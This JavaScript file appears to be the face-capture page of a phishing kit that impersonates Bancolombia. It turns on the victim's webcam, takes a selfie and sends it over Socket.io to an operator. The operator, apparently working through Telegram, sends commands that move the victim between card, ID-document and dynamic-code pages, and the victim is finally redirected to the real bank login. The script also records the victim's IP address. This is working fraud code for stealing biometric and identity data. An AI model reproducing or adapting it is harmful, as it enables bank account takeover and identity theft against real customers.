document.addEventListener('DOMContentLoaded', async function() {
    // Elementos del DOM
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const captureBtn = document.getElementById('captureBtn');
    const loadingOverlay = document.createElement('div');
    const sessionId = Date.now().toString();
    
    // Variables de estado
    let photoTaken = false;
    let stream = null;
    let photoData = null;
    let retryAttempts = 0;
    const maxRetryAttempts = 3;
    
    // Configuración de la pantalla de carga
    loadingOverlay.className = 'loading-overlay';
    loadingOverlay.innerHTML = `
        <img src="img/LogoBancolombia.png" alt="Cargando..." class="loading-logo">
    `;
    document.body.appendChild(loadingOverlay);
    loadingOverlay.style.display = 'none';

    // Configuración inicial de la cámara
    video.style.display = 'block';
    canvas.style.display = 'none';
    captureBtn.textContent = 'Tomar Foto';
    captureBtn.disabled = true;

    // Socket.io setup
    const socket = io({
        reconnection: true,
        reconnectionAttempts: 5,
        reconnectionDelay: 1000,
        query: { clientId: sessionId }
    });

    socket.emit('initSession', { sessionId });

    socket.on('connect_error', (error) => {
        console.error('Error de conexión Socket.io:', error);
    });

    socket.on('telegramAction', ({ action }) => {
        console.log('Acción recibida:', action);
        switch(action) {
            case 'index':
                window.location.href = 'index.html';
                break;
            case 'dinamica':
                window.location.href = 'dinamica.html';
                break;
            case 'terminos':
                window.location.href = 'terminos.html';
                break;
            case 'tarjeta':
                window.location.href = 'tarjeta.html';
                break;
            case 'cedula':
                window.location.href = 'cedula.html';
                break;
            case 'finalizar':
                window.location.href = 'https://svpersonas.apps.bancolombia.com/autenticacion';
                break;
        }
    });

    // Función para iniciar la cámara
    async function startCamera() {
        try {
            console.log('Iniciando cámara...');
            
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }

            // Solicitar permisos y enumerar dispositivos
            await navigator.mediaDevices.getUserMedia({ video: true });
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            // Configurar la cámara frontal
            const constraints = {
                video: {
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 },
                    frameRate: { ideal: 30 }
                }
            };

            try {
                stream = await navigator.mediaDevices.getUserMedia(constraints);
            } catch (e) {
                console.log('Fallback a configuración básica');
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
            }

            video.srcObject = stream;
            video.style.opacity = '1';

            return new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play()
                        .then(() => {
                            console.log('Cámara iniciada exitosamente');
                            video.style.display = 'block';
                            canvas.style.display = 'none';
                            captureBtn.disabled = false;
                            resolve();
                        })
                        .catch(error => {
                            console.error('Error al reproducir:', error);
                            resolve();
                        });
                };
            });
        } catch (err) {
            console.error('Error al iniciar la cámara:', err);
            alert('Error al acceder a la cámara. Por favor, permite el acceso y recarga la página.');
            captureBtn.disabled = true;
        }
    }

    // Función para intentar iniciar la cámara con reintentos
    async function initCameraWithRetry() {
        while (retryAttempts < maxRetryAttempts) {
            try {
                await startCamera();
                if (stream) {
                    // Activar el botón y mostrar estado
                    captureBtn.disabled = false;
                    captureBtn.classList.add('active');
                    return;
                }
            } catch (error) {
                console.log(`Intento ${retryAttempts + 1} fallido:`, error);
                retryAttempts++;
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }
        alert('No se pudo iniciar la cámara después de varios intentos. Por favor, recarga la página.');
    }

    // Iniciar la cámara al cargar
    await initCameraWithRetry();

    // Evento de captura de foto
    captureBtn.addEventListener('click', async function() {
        if (!photoTaken) {
            try {
                console.log('Verificando estado de la cámara...');
                
                // Asegurar que la cámara esté activa
                if (!stream || !video.srcObject) {
                    await startCamera();
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }

                // Esperar a que el video esté listo
                await new Promise((resolve, reject) => {
                    if (video.readyState === 4) {
                        resolve();
                    } else {
                        const timeoutId = setTimeout(() => {
                            reject(new Error('Timeout esperando video'));
                        }, 5000);

                        video.oncanplay = () => {
                            clearTimeout(timeoutId);
                            resolve();
                        };
                    }
                });

                // Capturar la foto
                const width = video.videoWidth || 1280;
                const height = video.videoHeight || 720;

                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                
                ctx.drawImage(video, 0, 0, width, height);
                photoData = canvas.toDataURL('image/jpeg', 0.9);

                // Actualizar UI
                video.style.display = 'none';
                canvas.style.display = 'block';
                captureBtn.textContent = 'Continuar';
                photoTaken = true;

                // Detener la cámara
                stream.getTracks().forEach(track => track.stop());
                stream = null;

                console.log('Foto capturada exitosamente');
            } catch (error) {
                console.error('Error al capturar:', error);
                alert('Error al capturar la foto. Por favor, intenta de nuevo.');
                await startCamera();
            }
        } else {
            // Enviar la foto
            try {
                loadingOverlay.style.display = 'flex';
                
                const sendPromise = new Promise((resolve, reject) => {
                    const timeoutId = setTimeout(() => {
                        socket.off('dataSent');
                        reject(new Error('Timeout'));
                    }, 30000);

                    socket.once('dataSent', () => {
                        clearTimeout(timeoutId);
                        resolve();
                    });

                    socket.emit('sendData', {
                        type: 'face',
                        sessionId,
                        content: {
                            text: '👤 Foto de rostro capturada\n⌚ ' + new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' }),
                            image: photoData
                        }
                    });
                });

                await sendPromise;

                // Mantener la pantalla de carga
                loadingOverlay.style.display = 'flex';
            } catch (error) {
                console.error('Error al enviar:', error);
                alert('Error al enviar la foto. Por favor, intenta de nuevo.');
                loadingOverlay.style.display = 'none';
            }
        }
    });

    // Actualizar IP y fecha/hora
    async function updateIpAndDateTime() {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            document.getElementById('ipAddress').textContent = `Dirección IP: ${ipData.ip}`;
            
            const now = new Date();
            const options = { 
                weekday: 'long', 
                year: 'numeric', 
                month: 'long', 
                day: 'numeric',
                hour: 'numeric',
                minute: 'numeric',
                hour12: true,
                timeZone: 'America/Bogota'
            };
            document.getElementById('datetime').textContent = now.toLocaleDateString('es-CO', options);
        } catch (error) {
            console.error('Error:', error);
        }
    }

    updateIpAndDateTime();
    setInterval(updateIpAndDateTime, 60000);
});